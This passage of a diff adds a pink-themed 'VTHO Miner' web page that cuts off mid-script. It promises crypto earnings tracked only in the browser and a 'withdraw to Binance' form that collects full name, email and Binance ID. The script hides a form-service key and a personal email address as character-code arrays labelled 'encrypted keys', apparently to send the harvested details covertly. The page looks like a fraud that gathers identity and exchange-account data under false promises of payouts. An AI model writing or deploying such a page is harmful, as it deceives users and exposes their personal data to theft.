@@ -1,0 +1,1413 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+<title>VTHO Miner | PAID PLUS</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', 'Segoe UI', Tahoma, sans-serif; -webkit-tap-highlight-color: transparent; user-select: none; -webkit-user-select: none; }
+
+  :root {
+    --pink: #f7b6c8;
+    --pink-bright: #ffd1dc;
+    --pink-neon: #ff8fab;
+    --pink-dark: #c48a9c;
+    --pink-soft: rgba(247,182,200,0.12);
+    --bg-deep: #fdf7f9;
+    --bg-mid: #fff5f8;
+    --card: rgba(255,255,255,0.7);
+    --border: rgba(247,182,200,0.35);
+    --text: #4a3540;
+    --text-dim: #a8899a;
+    --gold: #fbbf24;
+    --red: #ef4444;
+    --green: #22c55e;
+  }
+
+  html, body { width: 100%; min-height: 100vh; }
+
+  body {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    background: 
+      radial-gradient(ellipse 80% 50% at 50% -20%, rgba(247,182,200,0.35), transparent),
+      radial-gradient(ellipse 60% 40% at 100% 100%, rgba(255,209,220,0.4), transparent),
+      linear-gradient(180deg, #fff5f8 0%, #fdf7f9 100%);
+    color: var(--text);
+    padding: 20px;
+    overflow-x: hidden;
+    position: relative;
+  }
+
+  body::before {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background-image: 
+      radial-gradient(1px 1px at 20% 30%, rgba(255,143,171,0.5), transparent),
+      radial-gradient(1px 1px at 60% 70%, rgba(247,182,200,0.6), transparent),
+      radial-gradient(1px 1px at 80% 15%, rgba(255,143,171,0.6), transparent),
+      radial-gradient(1px 1px at 40% 90%, rgba(247,182,200,0.5), transparent),
+      radial-gradient(1.5px 1.5px at 10% 60%, rgba(255,209,220,0.7), transparent),
+      radial-gradient(1.5px 1.5px at 90% 40%, rgba(247,182,200,0.5), transparent);
+    background-size: 100% 100%;
+    animation: twinkle 4s infinite;
+    pointer-events: none;
+  }
+
+  @keyframes twinkle {
+    0%, 100% { opacity: 0.8; }
+    50% { opacity: 0.4; }
+  }
+
+  .header {
+    width: 100%;
+    max-width: 440px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 16px 20px;
+    background: linear-gradient(135deg, rgba(255,255,255,0.9), rgba(247,182,200,0.15));
+    border: 1px solid rgba(247,182,200,0.4);
+    border-radius: 20px;
+    margin-bottom: 18px;
+    position: relative;
+    overflow: hidden;
+    backdrop-filter: blur(12px);
+    box-shadow: 0 4px 20px rgba(247,182,200,0.15);
+  }
+
+  .header::before {
+    content: '';
+    position: absolute;
+    inset: 0;
+    background: linear-gradient(90deg, transparent, rgba(255,255,255,0.6), transparent);
+    animation: shine 4s infinite;
+  }
+
+  @keyframes shine {
+    0% { transform: translateX(-100%); }
+    100% { transform: translateX(100%); }
+  }
+
+  .logo-text {
+    font-size: 1.35rem;
+    font-weight: 900;
+    letter-spacing: 4px;
+    background: linear-gradient(135deg, #4a3540, #ff8fab, #f7b6c8);
+    -webkit-background-clip: text;
+    background-clip: text;
+    color: transparent;
+    position: relative;
+    z-index: 2;
+  }
+
+  .back-btn {
+    color: #4a3540;
+    text-decoration: none;
+    font-size: 11px;
+    font-weight: 800;
+    padding: 8px 15px;
+    background: rgba(247,182,200,0.2);
+    border-radius: 20px;
+    border: 1px solid rgba(247,182,200,0.4);
+    transition: 0.3s;
+    position: relative;
+    z-index: 2;
+    letter-spacing: 0.5px;
+  }
+
+  .back-btn:active { transform: scale(0.94); }
+
+  .main-card {
+    width: 100%;
+    max-width: 440px;
+    background: linear-gradient(160deg, rgba(255,255,255,0.85), rgba(255,245,248,0.6));
+    border: 1px solid rgba(247,182,200,0.35);
+    border-radius: 28px;
+    padding: 28px 24px;
+    backdrop-filter: blur(24px);
+    box-shadow: 
+      0 25px 70px rgba(247,182,200,0.25),
+      0 0 40px rgba(255,209,220,0.15),
+      inset 0 1px 0 rgba(255,255,255,0.8);
+    margin-bottom: 18px;
+    position: relative;
+    overflow: hidden;
+  }
+
+  .main-card::before {
+    content: '';
+    position: absolute;
+    top: -100px; left: -100px;
+    width: 250px; height: 250px;
+    background: radial-gradient(circle, rgba(255,209,220,0.5), transparent 70%);
+    border-radius: 50%;
+    pointer-events: none;
+  }
+
+  .balance-card {
+    background: linear-gradient(135deg, rgba(255,209,220,0.4), rgba(255,255,255,0.3));
+    border: 1px solid rgba(247,182,200,0.5);
+    border-radius: 20px;
+    padding: 20px;
+    text-align: center;
+    margin-bottom: 18px;
+    position: relative;
+    overflow: hidden;
+    box-shadow: inset 0 1px 0 rgba(255,255,255,0.9);
+  }
+
+  .balance-card::before {
+    content: '';
+    position: absolute;
+    top: 0; left: -100%;
+    width: 100%; height: 100%;
+    background: linear-gradient(90deg, transparent, rgba(255,255,255,0.6), transparent);
+    animation: shine 4s infinite;
+  }
+
+  .balance-label {
+    font-size: 0.7rem;
+    color: var(--text-dim);
+    letter-spacing: 3px;
+    margin-bottom: 8px;
+    font-weight: 700;
+    text-transform: uppercase;
+  }
+
+  .balance-value {
+    font-family: 'Inter', monospace;
+    font-size: 2.4rem;
+    font-weight: 800;
+    color: var(--text);
+    letter-spacing: 1px;
+    text-shadow: 
+      0 0 15px rgba(255,143,171,0.4),
+      0 0 30px rgba(247,182,200,0.3);
+    transition: transform 0.15s ease;
+    line-height: 1;
+  }
+
+  .balance-value.bump { animation: bump 0.2s ease; }
+
+  @keyframes bump {
+    0% { transform: scale(1); }
+    50% { transform: scale(1.08); }
+    100% { transform: scale(1); }
+  }
+
+  .balance-unit {
+    font-size: 0.8rem;
+    color: var(--pink-neon);
+    letter-spacing: 3px;
+    margin-top: 8px;
+    font-weight: 700;
+    text-transform: uppercase;
+  }
+
+  .timer-card {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    background: rgba(255,209,220,0.2);
+    border: 1px solid rgba(247,182,200,0.35);
+    border-radius: 16px;
+    padding: 14px 20px;
+    margin-bottom: 22px;
+    transition: 0.3s;
+  }
+
+  .timer-card.active {
+    background: rgba(255,209,220,0.5);
+    border-color: rgba(255,143,171,0.5);
+    box-shadow: 0 0 25px rgba(255,143,171,0.2);
+  }
+
+  .timer-label {
+    font-size: 0.72rem;
+    color: var(--text-dim);
+    letter-spacing: 2px;
+    font-weight: 700;
+    text-transform: uppercase;
+  }
+
+  .timer-value {
+    font-family: 'Inter', monospace;
+    font-size: 1.6rem;
+    font-weight: 800;
+    color: var(--pink-neon);
+    letter-spacing: 3px;
+    text-shadow: 0 0 15px rgba(255,143,171,0.4);
+    direction: ltr;
+  }
+
+  .vtho-stage {
+    position: relative;
+    width: 100%;
+    height: 270px;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+  }
+
+  .counter {
+    font-family: 'Inter', monospace;
+    font-size: 2.6rem;
+    font-weight: 800;
+    color: var(--text);
+    letter-spacing: 1px;
+    text-shadow: 
+      0 0 20px rgba(255,143,171,0.5),
+      0 0 40px rgba(247,182,200,0.4);
+    margin-bottom: 20px;
+    line-height: 1;
+    direction: ltr;
+    font-variant-numeric: tabular-nums;
+  }
+
+  .vtho-wrap {
+    position: relative;
+    width: 190px;
+    height: 190px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  }
+
+  .ring {
+    position: absolute;
+    border-radius: 50%;
+    border: 1px solid rgba(247,182,200,0.4);
+    pointer-events: none;
+    transition: border-color 0.4s;
+  }
+  .ring-1 { width: 175px; height: 175px; border-color: rgba(255,143,171,0.4); }
+  .ring-2 { 
+    width: 205px; height: 205px; 
+    border-style: dashed; 
+    border-color: rgba(247,182,200,0.35);
+    animation: spin 30s linear infinite; 
+  }
+  .ring-3 { width: 235px; height: 235px; border-color: rgba(255,209,220,0.25); }
+
+  @keyframes spin { to { transform: rotate(360deg); } }
+
+  .vtho-img {
+    width: 135px;
+    height: 135px;
+    border-radius: 50%;
+    cursor: pointer;
+    object-fit: cover;
+    z-index: 2;
+    background: #ffffff;
+    padding: 12px;
+    box-shadow:
+      0 0 0 3px rgba(255,143,171,0.5),
+      0 0 40px rgba(247,182,200,0.65),
+      0 0 80px rgba(255,209,220,0.4);
+    transition: box-shadow 0.3s, filter 0.3s, transform 0.3s;
+  }
+
+  .vtho-img:hover { 
+    filter: brightness(1.05);
+    transform: scale(1.03);
+  }
+
+  .vtho-img:active {
+    transform: scale(0.95);
+  }
+
+  .vtho-img.burst {
+    animation: shake 0.15s infinite;
+    box-shadow:
+      0 0 0 5px rgba(255,143,171,0.85),
+      0 0 70px rgba(255,143,171,0.9),
+      0 0 120px rgba(247,182,200,0.6);
+  }
+
+  @keyframes shake {
+    0%   { transform: translate(0, 0) rotate(0deg); }
+    20%  { transform: translate(-3px, 2px) rotate(-2deg); }
+    40%  { transform: translate(3px, -2px) rotate(2deg); }
+    60%  { transform: translate(-2px, -3px) rotate(-1deg); }
+    80%  { transform: translate(2px, 3px) rotate(1deg); }
+    100% { transform: translate(0, 0) rotate(0deg); }
+  }
+
+  .vtho-img.cooling {
+    opacity: 0.45;
+    cursor: not-allowed;
+    filter: grayscale(0.9) brightness(0.9);
+    box-shadow: 0 0 0 3px rgba(247,182,200,0.25);
+  }
+
+  .progress-wrap {
+    width: 100%;
+    max-width: 270px;
+    height: 4px;
+    background: rgba(247,182,200,0.25);
+    border-radius: 10px;
+    overflow: hidden;
+    margin-top: 20px;
+    opacity: 0;
+    transition: opacity 0.4s;
+  }
+
+  .progress-wrap.visible { opacity: 1; }
+
+  .progress-bar {
+    height: 100%;
+    width: 0%;
+    background: linear-gradient(90deg, #f7b6c8, #ff8fab);
+    border-radius: 10px;
+    transition: width 0.1s linear;
+    box-shadow: 0 0 15px rgba(255,143,171,0.6);
+  }
+
+  .status {
+    font-size: 0.78rem;
+    letter-spacing: 1.5px;
+    color: var(--text-dim);
+    margin-top: 16px;
+    min-height: 20px;
+    transition: color 0.3s;
+    font-weight: 600;
+    text-align: center;
+    padding: 0 10px;
+  }
+
+  .status.active { color: var(--pink-neon); }
+  .status.burst { color: var(--text); }
+  .status.cooling { color: var(--red); }
+
+  .stats-row {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 12px;
+    margin-top: 20px;
+  }
+
+  .stat-box {
+    background: rgba(255,209,220,0.2);
+    border: 1px solid rgba(247,182,200,0.3);
+    border-radius: 14px;
+    padding: 12px;
+    text-align: center;
+  }
+
+  .stat-label {
+    font-size: 0.65rem;
+    color: var(--text-dim);
+    letter-spacing: 1px;
+    margin-bottom: 6px;
+    font-weight: 700;
+    text-transform: uppercase;
+  }
+
+  .stat-value {
+    font-family: 'Inter', monospace;
+    font-size: 0.95rem;
+    font-weight: 700;
+    color: var(--pink-neon);
+    letter-spacing: 1px;
+  }
+
+  .actions-bottom {
+    width: 100%;
+    max-width: 440px;
+    display: flex;
+    flex-direction: column;
+    gap: 12px;
+  }
+
+  .action-btn {
+    width: 100%;
+    padding: 16px;
+    font-size: 0.88rem;
+    font-weight: 800;
+    letter-spacing: 1.5px;
+    border: 1px solid rgba(247,182,200,0.5);
+    border-radius: 16px;
+    cursor: pointer;
+    transition: all 0.3s;
+    font-family: 'Inter', sans-serif;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 10px;
+    position: relative;
+    overflow: hidden;
+  }
+
+  .action-btn svg { width: 16px; height: 16px; }
+
+  .withdraw-btn {
+    background: linear-gradient(135deg, rgba(255,209,220,0.5), rgba(247,182,200,0.15));
+    color: #c0647f;
+    border-color: rgba(255,143,171,0.5);
+    box-shadow: 0 0 20px rgba(255,143,171,0.15);
+  }
+
+  .withdraw-btn:not(:disabled):hover {
+    background: linear-gradient(135deg, rgba(255,143,171,0.4), rgba(247,182,200,0.15));
+    transform: translateY(-2px);
+    box-shadow: 0 10px 30px rgba(255,143,171,0.3);
+    border-color: rgba(255,143,171,0.7);
+  }
+
+  .withdraw-btn:disabled {
+    border-color: rgba(200,200,200,0.3);
+    color: #b8b8b8;
+    background: rgba(240,240,240,0.5);
+    cursor: not-allowed;
+    box-shadow: none;
+  }
+
+  .float-reward {
+    position: fixed;
+    color: var(--pink-neon);
+    font-family: 'Inter', monospace;
+    font-weight: 800;
+    font-size: 1.1rem;
+    pointer-events: none;
+    animation: floatUp 1.1s ease-out forwards;
+    z-index: 99;
+    text-shadow: 0 0 15px rgba(255,143,171,0.7);
+    direction: ltr;
+  }
+
+  @keyframes floatUp {
+    0%   { opacity: 1; transform: translateY(0) scale(1); }
+    100% { opacity: 0; transform: translateY(-80px) scale(1.2); }
+  }
+
+  .particle {
+    position: fixed;
+    width: 4px;
+    height: 4px;
+    border-radius: 50%;
+    background: var(--pink-neon);
+    pointer-events: none;
+    box-shadow: 0 0 10px var(--pink-neon);
+    animation: particleFly 1s ease-out forwards;
+  }
+
+  @keyframes particleFly {
+    0%   { opacity: 1; transform: translate(0, 0) scale(1); }
+    100% { opacity: 0; transform: translate(var(--tx), var(--ty)) scale(0.2); }
+  }
+
+  .toast {
+    position: fixed;
+    bottom: 30px;
+    left: 50%;
+    transform: translateX(-50%) translateY(100px);
+    background: rgba(255,255,255,0.98);
+    border: 1px solid rgba(247,182,200,0.5);
+    border-radius: 14px;
+    padding: 14px 26px;
+    color: var(--text);
+    font-size: 0.85rem;
+    transition: transform 0.4s ease;
+    z-index: 200;
+    box-shadow: 0 10px 40px rgba(247,182,200,0.4);
+    max-width: 90%;
+    text-align: center;
+    font-weight: 700;
+  }
+
+  .toast.show { transform: translateX(-50%) translateY(0); }
+  .toast.error { border-color: rgba(239,68,68,0.5); color: #dc2626; }
+  .toast.success { border-color: rgba(255,143,171,0.6); color: #c0647f; }
+
+  .modal-overlay {
+    position: fixed;
+    inset: 0;
+    background: rgba(74,53,64,0.5);
+    backdrop-filter: blur(15px);
+    display: none;
+    align-items: center;
+    justify-content: center;
+    z-index: 400;
+    padding: 20px;
+    overflow-y: auto;
+  }
+
+  .modal-overlay.show { display: flex; animation: fadeIn 0.3s; }
+
+  @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+
+  .modal {
+    background: linear-gradient(160deg, #ffffff, #fff5f8);
+    border: 1px solid rgba(247,182,200,0.5);
+    border-radius: 26px;
+    padding: 30px 26px;
+    width: 100%;
+    max-width: 410px;
+    box-shadow: 
+      0 30px 80px rgba(247,182,200,0.4),
+      inset 0 1px 0 rgba(255,255,255,1);
+    animation: slideUp 0.4s;
+    color: var(--text);
+    max-height: calc(100vh - 40px);
+    overflow-y: auto;
+  }
+
+  @keyframes slideUp {
+    from { transform: translateY(40px); opacity: 0; }
+    to { transform: translateY(0); opacity: 1; }
+  }
+
+  .binance-logo {
+    width: 74px;
+    height: 74px;
+    margin: 0 auto 20px;
+    background: #000;
+    border-radius: 20px;
+    padding: 14px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    box-shadow: 0 0 0 3px rgba(240,185,11,0.3);
+    border: 2px solid rgba(240,185,11,0.4);
+  }
+
+  .binance-logo img {
+    width: 100%;
+    height: 100%;
+    object-fit: contain;
+  }
+
+  .modal-title {
+    font-size: 1.3rem;
+    font-weight: 900;
+    text-align: center;
+    margin-bottom: 8px;
+    background: linear-gradient(135deg, #4a3540, #ff8fab, #f7b6c8);
+    -webkit-background-clip: text;
+    background-clip: text;
+    color: transparent;
+  }
+
+  .modal-sub {
+    font-size: 0.82rem;
+    color: var(--text-dim);
+    text-align: center;
+    margin-bottom: 18px;
+    line-height: 1.7;
+  }
+
+  .kyc-notice {
+    background: linear-gradient(135deg, rgba(240,185,11,0.12), rgba(240,185,11,0.04));
+    border: 1px solid rgba(240,185,11,0.35);
+    border-radius: 14px;
+    padding: 12px 14px;
+    display: flex;
+    gap: 10px;
+    align-items: flex-start;
+    margin-bottom: 18px;
+  }
+  .kyc-notice svg {
+    width: 18px;
+    height: 18px;
+    flex-shrink: 0;
+    stroke: #d97706;
+    fill: none;
+    stroke-width: 2.2;
+    stroke-linecap: round;
+    stroke-linejoin: round;
+    margin-top: 1px;
+  }
+  .kyc-notice-text {
+    font-size: 11.5px;
+    line-height: 1.55;
+    color: #92400e;
+    font-weight: 600;
+    text-align: left;
+  }
+  .kyc-notice-text b { color: #b45309; font-weight: 800; }
+
+  .modal-balance {
+    background: linear-gradient(135deg, rgba(255,209,220,0.5), rgba(255,255,255,0.4));
+    border: 2px solid rgba(255,143,171,0.4);
+    border-radius: 16px;
+    padding: 16px;
+    text-align: center;
+    margin-bottom: 20px;
+  }
+
+  .modal-balance-label {
+    font-size: 11px;
+    color: var(--text-dim);
+    font-weight: 700;
+    margin-bottom: 6px;
+    letter-spacing: 1px;
+    text-transform: uppercase;
+  }
+
+  .modal-balance-value {
+    font-size: 28px;
+    font-weight: 900;
+    color: var(--text);
+    direction: ltr;
+    line-height: 1;
+    text-shadow: 0 0 15px rgba(255,143,171,0.4);
+  }
+
+  .modal-balance-value small { font-size: 14px; opacity: 0.85; color: var(--pink-neon); }
+
+  .form-group { margin-bottom: 14px; }
+
+  .form-group label {
+    display: block;
+    font-size: 12px;
+    font-weight: 800;
+    margin-bottom: 8px;
+    color: var(--text);
+  }
+
+  .form-group label::after {
+    content: ' *';
+    color: #ef4444;
+  }
+
+  .form-group input {
+    width: 100%;
+    padding: 14px;
+    background: rgba(255,255,255,0.7);
+    border: 2px solid rgba(247,182,200,0.4);
+    border-radius: 14px;
+    color: var(--text);
+    font-family: 'Inter', sans-serif;
+    font-size: 0.95rem;
+    text-align: left;
+    letter-spacing: 0.5px;
+    outline: none;
+    transition: border-color 0.3s;
+  }
+
+  .form-group input:focus {
+    border-color: var(--pink-neon);
+    box-shadow: 0 0 0 4px rgba(255,143,171,0.15);
+    background: #ffffff;
+  }
+
+  .form-group input::placeholder {
+    color: rgba(168,137,154,0.5);
+    font-size: 0.85rem;
+  }
+
+  .modal-actions {
+    display: flex;
+    gap: 12px;
+    margin-top: 20px;
+  }
+
+  .btn {
+    flex: 1;
+    padding: 14px;
+    border: none;
+    border-radius: 14px;
+    font-weight: 800;
+    font-size: 0.85rem;
+    letter-spacing: 1px;
+    cursor: pointer;
+    transition: all 0.25s;
+    font-family: 'Inter', sans-serif;
+  }
+
+  .btn-cancel {
+    background: rgba(240,240,240,0.9);
+    color: #6b7280;
+  }
+
+  .btn-cancel:hover { background: rgba(220,220,220,0.9); }
+
+  .btn-confirm {
+    background: linear-gradient(135deg, #f7b6c8, #ff8fab);
+    color: #ffffff;
+    box-shadow: 0 5px 20px rgba(255,143,171,0.4);
+  }
+
+  .btn-confirm:hover:not(:disabled) {
+    transform: translateY(-2px);
+    box-shadow: 0 8px 25px rgba(255,143,171,0.6);
+  }
+
+  .btn-confirm:disabled { opacity: 0.6; cursor: not-allowed; }
+
+  @media (max-width: 420px) {
+    .counter { font-size: 2.2rem; }
+    .balance-value { font-size: 1.9rem; }
+    .logo-text { font-size: 1.15rem; letter-spacing: 3px; }
+    .vtho-wrap { width: 170px; height: 170px; }
+    .vtho-img { width: 120px; height: 120px; padding: 10px; }
+    .ring-1 { width: 158px; height: 158px; }
+    .ring-2 { width: 188px; height: 188px; }
+    .ring-3 { width: 218px; height: 218px; }
+    .modal { padding: 24px 20px; }
+    .balance-value { font-size: 1.9rem; }
+  }
+</style>
+</head>
+<body>
+
+  <div class="header">
+    <div class="logo-text">VTHO MINER</div>
+    <a href="mining.html" class="back-btn">← BACK</a>
+  </div>
+
+  <div class="main-card">
+
+    <div class="balance-card">
+      <div class="balance-label">Total Balance</div>
+      <div class="balance-value" id="balanceEl">0.00</div>
+      <div class="balance-unit">VTHO</div>
+    </div>
+
+    <div class="timer-card" id="timerCard">
+      <div class="timer-label">Cycle Remaining</div>
+      <div class="timer-value" id="timerEl">--:--</div>
+    </div>
+
+    <div class="vtho-stage">
+      <div class="counter" id="counter">0.00</div>
+
+      <div class="vtho-wrap">
+        <div class="ring ring-1"></div>
+        <div class="ring ring-2"></div>
+        <div class="ring ring-3"></div>
+        <img id="vthoImg" class="vtho-img" src="vtho.png" alt="VTHO">
+      </div>
+
+      <div class="progress-wrap" id="progressWrap">
+        <div class="progress-bar" id="progressBar"></div>
+      </div>
+
+      <div class="status" id="statusEl">Tap to mine +1.00 VTHO</div>
+    </div>
+
+    <div class="stats-row">
+      <div class="stat-box">
+        <div class="stat-label">Mining Rate</div>
+        <div class="stat-value" id="rateEl">1.00 / 30 min</div>
+      </div>
+      <div class="stat-box">
+        <div class="stat-label">System Status</div>
+        <div class="stat-value" id="sysStatusEl">Ready</div>
+      </div>
+    </div>
+
+  </div>
+
+  <div class="actions-bottom">
+
+    <button class="action-btn withdraw-btn" id="withdrawBtn" disabled>
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+        <rect x="3" y="11" width="18" height="11" rx="2"/>
+        <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
+      </svg>
+      <span id="withdrawText">Withdraw · Min 10.00 VTHO</span>
+    </button>
+
+  </div>
+
+  <!-- ===== WITHDRAW MODAL ===== -->
+  <div class="modal-overlay" id="modalOverlay">
+    <div class="modal" id="modalContent">
+      
+      <div class="binance-logo">
+        <img src="Binance_Logo.png" alt="Binance" onerror="this.style.display='none'">
+      </div>
+
+      <div class="modal-title">Withdraw to Binance</div>
+      <div class="modal-sub">Enter your details to proceed</div>
+
+      <div class="kyc-notice">
+        <svg viewBox="0 0 24 24">
+          <path d="M12 9v4"/>
+          <path d="M12 17h.01"/>
+          <path d="M10.29 3.86 1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/>
+        </svg>
+        <div class="kyc-notice-text">
+          Your Binance account must be <b>fully KYC verified</b> (Identity Verified) before requesting a withdrawal. Unverified accounts will not receive rewards.
+        </div>
+      </div>
+
+      <div class="modal-balance">
+        <div class="modal-balance-label">Available to Withdraw</div>
+        <div class="modal-balance-value"><span id="modalBalance">0.00</span> <small>VTHO</small></div>
+      </div>
+
+      <form id="withdrawForm" onsubmit="submitWithdraw(event)">
+        <input type="hidden" name="subject" value="VTHO Withdrawal Request - VTHO Miner" />
+        <input type="hidden" name="amount" id="fieldAmount" value="" />
+        <input type="hidden" name="withdraw_date" id="fieldDate" value="" />
+        <input type="hidden" name="game" value="VTHO Miner" />
+
+        <div class="form-group">
+          <label>Full Name</label>
+          <input type="text" name="full_name" placeholder="Enter your full name" required autocomplete="name" />
+        </div>
+
+        <div class="form-group">
+          <label>Email Address</label>
+          <input type="email" name="user_email" placeholder="Enter your email" required autocomplete="email" inputmode="email" />
+        </div>
+
+        <div class="form-group">
+          <label>Binance ID</label>
+          <input type="text" name="binance_id" placeholder="Enter Binance ID" inputmode="numeric" pattern="[0-9]*" required autocomplete="off" />
+        </div>
+
+        <div class="modal-actions">
+          <button type="button" class="btn btn-cancel" onclick="closeWithdraw()">Cancel</button>
+          <button type="submit" class="btn btn-confirm" id="confirmBtn">Submit Request</button>
+        </div>
+      </form>
+    </div>
+  </div>
+
+  <div class="toast" id="toast"></div>
+
+<script>
+  /* ============================================
+     ENCRYPTED KEYS
+  ============================================ */
+  const _K1 = [115, 102, 95, 100, 98, 49, 50, 48, 102, 98, 98];
+  const _K2 = [99, 101, 97, 53, 48, 48, 49, 97, 56, 54, 100, 98];
+  const _K3 = [53, 99, 52, 56];
+  const _EM = [109, 97, 121, 97, 114, 97, 113, 64, 103, 109, 97, 105, 108, 46, 99, 111, 109];
+
+  function _dk() {
+    let s = '';
+    for (let i = 0; i < _K1.length; i++) s += String.fromCharCode(_K1[i]);
+    for (let i = 0; i < _K2.length; i++) s += String.fromCharCode(_K2[i]);
+    for (let i = 0; i < _K3.length; i++) s += String.fromCharCode(_K3[i]);
+    return s;
+  }
+
+  function _de() {
+    let s = '';
+    for (let i = 0; i < _EM.length; i++) s += String.fromCharCode(_EM[i]);
+    return s;
+  }
+
+  /* ============ CONFIG ============ */
+  const BURST_AMOUNT   = 1.00;
+  const BURST_DURATION = 10000;
+  const CYCLE_VTHO     = 1.00;
+  const CYCLE_MS       = 30 * 60 * 1000;
+  const MIN_WITHDRAW   = 10.00;
+
+  /* ============ SAVE STATE ============ */
+  function saveState() {
+    localStorage.setItem('vtho_balance', balance);
+    localStorage.setItem('vtho_cycleStart', cycleStartTime);
+    localStorage.setItem('vtho_cycleActive', cycleActive ? '1' : '0');
+    localStorage.setItem('vtho_burstActive', burstActive ? '1' : '0');
+    localStorage.setItem('vtho_lastUpdate', Date.now());
+  }
+
+  /* ============ STATE ============ */
+  let balance        = parseFloat(localStorage.getItem('vtho_balance') || '0');
+  let burstActive    = false;
+  let cycleActive    = false;
+  let burstTimer     = null;
+  let cycleStartTime = parseInt(localStorage.getItem('vtho_cycleStart') || '0');
+
+  /* ============ ELEMENTS ============ */
+  const balanceEl    = document.getElementById('balanceEl');
+  const counterEl    = document.getElementById('counter');
+  const timerEl      = document.getElementById('timerEl');
+  const timerCard    = document.getElementById('timerCard');
+  const vthoImg      = document.getElementById('vthoImg');
+  const progressWrap = document.getElementById('progressWrap');
+  const progressBar  = document.getElementById('progressBar');
+  const statusEl     = document.getElementById('statusEl');
+  const rateEl       = document.getElementById('rateEl');
+  const sysStatusEl  = document.getElementById('sysStatusEl');
+  const withdrawBtn  = document.getElementById('withdrawBtn');
+  const withdrawText = document.getElementById('withdrawText');
+  const modalOverlay = document.getElementById('modalOverlay');
+  const modalContent = document.getElementById('modalContent');
+  const modalBalance = document.getElementById('modalBalance');
+  const confirmBtn   = document.getElementById('confirmBtn');
+  const toastEl      = document.getElementById('toast');
+
+  /* ============ FORMATTING (with decimals) ============ */
+  function formatNum(v) {
+    // Always show 2 decimal places: 0.00, 0.01, 1.00, 10.50 ...
+    return v.toFixed(2);
+  }
+
+  function formatTime(ms) {
+    if (ms < 0) ms = 0;
+    const totalSec = Math.floor(ms / 1000);
+    const h = Math.floor(totalSec / 3600);
+    const m = Math.floor((totalSec % 3600) / 60);
+    const s = totalSec % 60;
+    if (h > 0) {
+      return String(h).padStart(2, '0') + ':' + String(m).padStart(2, '0') + ':' + String(s).padStart(2, '0');
+    }
+    return String(m).padStart(2, '0') + ':' + String(s).padStart(2, '0');
+  }
+
+  function updateBalanceUI(bump = false) {
+    balanceEl.textContent = formatNum(balance);
+    counterEl.textContent = formatNum(balance);
+    if (bump) {
+      balanceEl.classList.remove('bump');
+      void balanceEl.offsetWidth;
+      balanceEl.classList.add('bump');
+    }
+    
+    if (balance >= MIN_WITHDRAW) {
+      withdrawBtn.disabled = false;
+      withdrawText.textContent = 'Withdraw · ' + formatNum(balance) + ' VTHO';
+    } else {
+      withdrawBtn.disabled = true;
+      withdrawText.textContent = 'Withdraw · Min 10.00 VTHO';
+    }
+    saveState();
+  }
+
+  function showToast(msg, type = '', duration = 2500) {
+    toastEl.textContent = msg;
+    toastEl.className = 'toast';
+    if (type) toastEl.classList.add(type);
+    toastEl.classList.add('show');
+    clearTimeout(toastEl._t);
+    toastEl._t = setTimeout(() => {
+      toastEl.classList.remove('show');
+    }, duration);
+  }
+
+  function floatNumber(text) {
+    const el = document.createElement('div');
+    el.className = 'float-reward';
+    el.textContent = text;
+    const rect = vthoImg.getBoundingClientRect();
+    el.style.left = (rect.left + rect.width / 2 - 20 + (Math.random() * 40 - 20)) + 'px';
+    el.style.top  = (rect.top - 10) + 'px';
+    document.body.appendChild(el);
+    setTimeout(() => el.remove(), 1100);
+  }
+
+  function spawnParticles(count = 10) {
+    const rect = vthoImg.getBoundingClientRect();
+    const cx = rect.left + rect.width / 2;
+    const cy = rect.top + rect.height / 2;
+    for (let i = 0; i < count; i++) {
+      const p = document.createElement('div');
+      p.className = 'particle';
+      const angle = (Math.PI * 2 * i) / count + Math.random() * 0.5;
+      const dist  = 70 + Math.random() * 60;
+      p.style.left = cx + 'px';
+      p.style.top  = cy + 'px';
+      p.style.setProperty('--tx', (Math.cos(angle) * dist) + 'px');
+      p.style.setProperty('--ty', (Math.sin(angle) * dist) + 'px');
+      document.body.appendChild(p);
+      setTimeout(() => p.remove(), 1000);
+    }
+  }
+
+  /* ============ INTEGRITY CHECK ============ */
+  function checkIntegrity() {
+    const lastUpdate = parseInt(localStorage.getItem('vtho_lastUpdate') || '0');
+    const now = Date.now();
+    if (lastUpdate > 0 && now < lastUpdate - 60000) {
+      localStorage.clear();
+      location.reload();
+      return false;
+    }
+    return true;
+  }
+
+  /* ============ BUTTON STATE ============ */
+  function canClick() { return !cycleActive && !burstActive; }
+
+  function updateVthoButton() {
+    if (canClick()) {
+      vthoImg.classList.remove('cooling');
+      statusEl.textContent = 'Tap to mine +1.00 VTHO';
+      statusEl.className = 'status';
+    } else {
+      vthoImg.classList.add('cooling');
+      const remaining = CYCLE_MS - (Date.now() - cycleStartTime);
+      statusEl.textContent = 'Mining cycle · ' + formatTime(remaining) + ' remaining';
+      statusEl.className = 'status cooling';
+    }
+  }
+
+  /* ============ FAST MINING (decimal counting) ============ */
+  function startBurst() {
+    if (burstActive) return;
+    if (!canClick()) { showToast('Wait for the cycle to finish'); return; }
+
+    burstActive = true;
+    cycleActive = true;
+    cycleStartTime = Date.now();
+    saveState();
+
+    vthoImg.classList.add('burst');
+    progressWrap.classList.add('visible');
+    statusEl.textContent = 'Fast mining...';
+    statusEl.className = 'status burst';
+    sysStatusEl.textContent = 'Mining';
+    sysStatusEl.style.color = '#ff8fab';
+
+    const startTime = Date.now();
+    const startBalance = balance;
+
